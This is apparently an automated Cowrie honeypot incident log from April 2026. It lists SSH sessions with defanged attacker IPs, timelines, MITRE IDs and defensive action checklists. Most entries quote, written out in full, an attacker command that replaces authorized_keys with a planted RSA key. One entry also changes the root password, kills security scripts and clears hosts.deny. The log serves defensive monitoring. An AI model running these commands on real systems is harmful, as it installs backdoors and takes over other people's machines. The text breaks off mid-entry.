| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:03 |
| **Last Seen** | 2026-04-11 06:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:03:12` | `cowrie.session.connect` |
| `2026-04-11 06:03:12` | `cowrie.client.version` |
| `2026-04-11 06:03:13` | `cowrie.client.kex` |
| `2026-04-11 06:03:13` | `cowrie.login.success` |
| `2026-04-11 06:03:13` | `cowrie.session.params` |
| `2026-04-11 06:03:13` | `cowrie.command.input` |
| `2026-04-11 06:03:13` | `cowrie.command.failed` |
| `2026-04-11 06:03:14` | `cowrie.log.closed` |
| `2026-04-11 06:03:14` | `cowrie.session.params` |
| `2026-04-11 06:03:14` | `cowrie.command.input` |
| `2026-04-11 06:03:14` | `cowrie.session.file_download` |
| `2026-04-11 06:03:14` | `cowrie.log.closed` |
| `2026-04-11 06:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-230307a13309

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 06:03 |
| **Last Seen** | 2026-04-11 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:03:16` | `cowrie.session.connect` |
| `2026-04-11 06:03:16` | `cowrie.client.version` |
| `2026-04-11 06:03:16` | `cowrie.client.kex` |
| `2026-04-11 06:03:17` | `cowrie.login.success` |
| `2026-04-11 06:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e110bf561802

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:03 |
| **Last Seen** | 2026-04-11 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:03:31` | `cowrie.session.connect` |
| `2026-04-11 06:03:31` | `cowrie.client.version` |
| `2026-04-11 06:03:31` | `cowrie.client.kex` |
| `2026-04-11 06:03:31` | `cowrie.login.success` |
| `2026-04-11 06:03:31` | `cowrie.session.params` |
| `2026-04-11 06:03:31` | `cowrie.command.input` |
| `2026-04-11 06:03:31` | `cowrie.command.failed` |
| `2026-04-11 06:03:31` | `cowrie.log.closed` |
| `2026-04-11 06:03:31` | `cowrie.session.params` |
| `2026-04-11 06:03:31` | `cowrie.command.input` |
| `2026-04-11 06:03:31` | `cowrie.session.file_download` |
| `2026-04-11 06:03:31` | `cowrie.log.closed` |
| `2026-04-11 06:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-698a74687820

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 06:03 |
| **Last Seen** | 2026-04-11 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:03:32` | `cowrie.session.connect` |
| `2026-04-11 06:03:32` | `cowrie.client.version` |
| `2026-04-11 06:03:32` | `cowrie.client.kex` |
| `2026-04-11 06:03:32` | `cowrie.login.success` |
| `2026-04-11 06:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469f3b623f48

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:04 |
| **Last Seen** | 2026-04-11 06:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:04:34` | `cowrie.session.connect` |
| `2026-04-11 06:04:34` | `cowrie.client.version` |
| `2026-04-11 06:04:34` | `cowrie.client.kex` |
| `2026-04-11 06:04:36` | `cowrie.login.success` |
| `2026-04-11 06:04:37` | `cowrie.session.params` |
| `2026-04-11 06:04:37` | `cowrie.command.input` |
| `2026-04-11 06:04:37` | `cowrie.command.failed` |
| `2026-04-11 06:04:37` | `cowrie.log.closed` |
| `2026-04-11 06:04:38` | `cowrie.session.params` |
| `2026-04-11 06:04:38` | `cowrie.command.input` |
| `2026-04-11 06:04:38` | `cowrie.session.file_download` |
| `2026-04-11 06:04:38` | `cowrie.log.closed` |
| `2026-04-11 06:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d7e5a6df5a1

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:04 |
| **Last Seen** | 2026-04-11 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:04:42` | `cowrie.session.connect` |
| `2026-04-11 06:04:42` | `cowrie.client.version` |
| `2026-04-11 06:04:43` | `cowrie.client.kex` |
| `2026-04-11 06:04:44` | `cowrie.login.success` |
| `2026-04-11 06:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eab7df7ed7c

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:04 |
| **Last Seen** | 2026-04-11 06:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:04:50` | `cowrie.session.connect` |
| `2026-04-11 06:04:50` | `cowrie.client.version` |
| `2026-04-11 06:04:50` | `cowrie.client.kex` |
| `2026-04-11 06:04:51` | `cowrie.login.success` |
| `2026-04-11 06:04:52` | `cowrie.session.params` |
| `2026-04-11 06:04:52` | `cowrie.command.input` |
| `2026-04-11 06:04:52` | `cowrie.command.failed` |
| `2026-04-11 06:04:52` | `cowrie.log.closed` |
| `2026-04-11 06:04:53` | `cowrie.session.params` |
| `2026-04-11 06:04:53` | `cowrie.command.input` |
| `2026-04-11 06:04:54` | `cowrie.session.file_download` |
| `2026-04-11 06:04:54` | `cowrie.log.closed` |
| `2026-04-11 06:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-274e0e1ec142

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:04 |
| **Last Seen** | 2026-04-11 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:04:57` | `cowrie.session.connect` |
| `2026-04-11 06:04:57` | `cowrie.client.version` |
| `2026-04-11 06:04:58` | `cowrie.client.kex` |
| `2026-04-11 06:04:59` | `cowrie.login.success` |
| `2026-04-11 06:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92482e02a888

| Field | Detail |
|---|---|
| **Source IP** | `106.225.192[.]15` |
| **First Seen** | 2026-04-11 06:05 |
| **Last Seen** | 2026-04-11 06:06 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rO26B5LNRBps"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:05:53` | `cowrie.session.connect` |
| `2026-04-11 06:05:53` | `cowrie.client.version` |
| `2026-04-11 06:05:53` | `cowrie.client.kex` |
| `2026-04-11 06:05:54` | `cowrie.login.success` |
| `2026-04-11 06:05:55` | `cowrie.session.params` |
| `2026-04-11 06:05:55` | `cowrie.command.input` |
| `2026-04-11 06:05:55` | `cowrie.command.failed` |
| `2026-04-11 06:05:55` | `cowrie.log.closed` |
| `2026-04-11 06:05:55` | `cowrie.session.params` |
| `2026-04-11 06:05:55` | `cowrie.command.input` |
| `2026-04-11 06:05:55` | `cowrie.session.file_download` |
| `2026-04-11 06:05:55` | `cowrie.log.closed` |
| `2026-04-11 06:06:12` | `cowrie.session.params` |
| `2026-04-11 06:06:12` | `cowrie.command.input` |
| `2026-04-11 06:06:13` | `cowrie.log.closed` |
| `2026-04-11 06:06:13` | `cowrie.session.params` |
| `2026-04-11 06:06:13` | `cowrie.command.input` |
| `2026-04-11 06:06:13` | `cowrie.log.closed` |
| `2026-04-11 06:06:14` | `cowrie.session.params` |
| `2026-04-11 06:06:14` | `cowrie.command.input` |
| `2026-04-11 06:06:14` | `cowrie.session.file_download` |
| `2026-04-11 06:06:14` | `cowrie.log.closed` |
| `2026-04-11 06:06:14` | `cowrie.session.params` |
| `2026-04-11 06:06:14` | `cowrie.command.input` |
| `2026-04-11 06:06:14` | `cowrie.log.closed` |
| `2026-04-11 06:06:15` | `cowrie.session.params` |
| `2026-04-11 06:06:15` | `cowrie.command.input` |
| `2026-04-11 06:06:15` | `cowrie.log.closed` |
| `2026-04-11 06:06:15` | `cowrie.session.params` |
| `2026-04-11 06:06:15` | `cowrie.command.input` |
| `2026-04-11 06:06:15` | `cowrie.command.input` |
| `2026-04-11 06:06:15` | `cowrie.log.closed` |
| `2026-04-11 06:06:16` | `cowrie.session.params` |
| `2026-04-11 06:06:16` | `cowrie.command.input` |
| `2026-04-11 06:06:16` | `cowrie.log.closed` |
| `2026-04-11 06:06:17` | `cowrie.session.params` |
| `2026-04-11 06:06:17` | `cowrie.command.input` |
| `2026-04-11 06:06:17` | `cowrie.log.closed` |
| `2026-04-11 06:06:17` | `cowrie.session.params` |
| `2026-04-11 06:06:17` | `cowrie.command.input` |
| `2026-04-11 06:06:17` | `cowrie.log.closed` |
| `2026-04-11 06:06:18` | `cowrie.session.params` |
| `2026-04-11 06:06:18` | `cowrie.command.input` |
| `2026-04-11 06:06:18` | `cowrie.log.closed` |
| `2026-04-11 06:06:18` | `cowrie.session.params` |
| `2026-04-11 06:06:18` | `cowrie.command.input` |
| `2026-04-11 06:06:18` | `cowrie.log.closed` |
| `2026-04-11 06:06:19` | `cowrie.session.params` |
| `2026-04-11 06:06:19` | `cowrie.command.input` |
| `2026-04-11 06:06:19` | `cowrie.log.closed` |
| `2026-04-11 06:06:19` | `cowrie.session.params` |
| `2026-04-11 06:06:19` | `cowrie.command.input` |
| `2026-04-11 06:06:19` | `cowrie.log.closed` |
| `2026-04-11 06:06:20` | `cowrie.session.params` |
| `2026-04-11 06:06:20` | `cowrie.command.input` |
| `2026-04-11 06:06:20` | `cowrie.log.closed` |
| `2026-04-11 06:06:20` | `cowrie.session.params` |
| `2026-04-11 06:06:20` | `cowrie.command.input` |
| `2026-04-11 06:06:20` | `cowrie.log.closed` |
| `2026-04-11 06:06:21` | `cowrie.session.params` |
| `2026-04-11 06:06:21` | `cowrie.command.input` |
| `2026-04-11 06:06:21` | `cowrie.log.closed` |
| `2026-04-11 06:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.225.192[.]15` to AbuseIPDB if not already reported
- [ ] Block `106.225.192[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67efb5586ab1

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:06 |
| **Last Seen** | 2026-04-11 06:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:06:38` | `cowrie.session.connect` |
| `2026-04-11 06:06:38` | `cowrie.client.version` |
| `2026-04-11 06:06:38` | `cowrie.client.kex` |
| `2026-04-11 06:06:40` | `cowrie.login.success` |
| `2026-04-11 06:06:41` | `cowrie.session.params` |
| `2026-04-11 06:06:41` | `cowrie.command.input` |
| `2026-04-11 06:06:41` | `cowrie.command.failed` |
| `2026-04-11 06:06:41` | `cowrie.log.closed` |
| `2026-04-11 06:06:42` | `cowrie.session.params` |
| `2026-04-11 06:06:42` | `cowrie.command.input` |
| `2026-04-11 06:06:42` | `cowrie.session.file_download` |
| `2026-04-11 06:06:42` | `cowrie.log.closed` |
| `2026-04-11 06:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27bc36b7514e

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:06 |
| **Last Seen** | 2026-04-11 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:06:46` | `cowrie.session.connect` |
| `2026-04-11 06:06:46` | `cowrie.client.version` |
| `2026-04-11 06:06:46` | `cowrie.client.kex` |
| `2026-04-11 06:06:48` | `cowrie.login.success` |
| `2026-04-11 06:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f20c771004

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:06 |
| **Last Seen** | 2026-04-11 06:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:06:51` | `cowrie.session.connect` |
| `2026-04-11 06:06:51` | `cowrie.client.version` |
| `2026-04-11 06:06:51` | `cowrie.client.kex` |
| `2026-04-11 06:06:52` | `cowrie.login.success` |
| `2026-04-11 06:06:53` | `cowrie.session.params` |
| `2026-04-11 06:06:53` | `cowrie.command.input` |
| `2026-04-11 06:06:53` | `cowrie.command.failed` |
| `2026-04-11 06:06:54` | `cowrie.log.closed` |
| `2026-04-11 06:06:54` | `cowrie.session.params` |
| `2026-04-11 06:06:54` | `cowrie.command.input` |
| `2026-04-11 06:06:55` | `cowrie.session.file_download` |
| `2026-04-11 06:06:55` | `cowrie.log.closed` |
| `2026-04-11 06:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c744cd9fdd90

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 06:06 |
| **Last Seen** | 2026-04-11 06:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:06:58` | `cowrie.session.connect` |
| `2026-04-11 06:06:58` | `cowrie.client.version` |
| `2026-04-11 06:06:59` | `cowrie.client.kex` |
| `2026-04-11 06:07:00` | `cowrie.login.success` |
| `2026-04-11 06:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b2e8462184

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:07 |
| **Last Seen** | 2026-04-11 06:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:07:46` | `cowrie.session.connect` |
| `2026-04-11 06:07:46` | `cowrie.client.version` |
| `2026-04-11 06:07:46` | `cowrie.client.kex` |
| `2026-04-11 06:07:47` | `cowrie.login.success` |
| `2026-04-11 06:07:48` | `cowrie.session.params` |
| `2026-04-11 06:07:48` | `cowrie.command.input` |
| `2026-04-11 06:07:48` | `cowrie.command.failed` |
| `2026-04-11 06:07:48` | `cowrie.log.closed` |
| `2026-04-11 06:07:49` | `cowrie.session.params` |
| `2026-04-11 06:07:49` | `cowrie.command.input` |
| `2026-04-11 06:07:49` | `cowrie.session.file_download` |
| `2026-04-11 06:07:49` | `cowrie.log.closed` |
| `2026-04-11 06:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.41[.]212` to AbuseIPDB if not already reported
- [ ] Block `209.141.41[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1397caa73bb9

| Field | Detail |
|---|---|
| **Source IP** | `209.141.41[.]212` |
| **First Seen** | 2026-04-11 06:07 |
| **Last Seen** | 2026-04-11 06:07 |
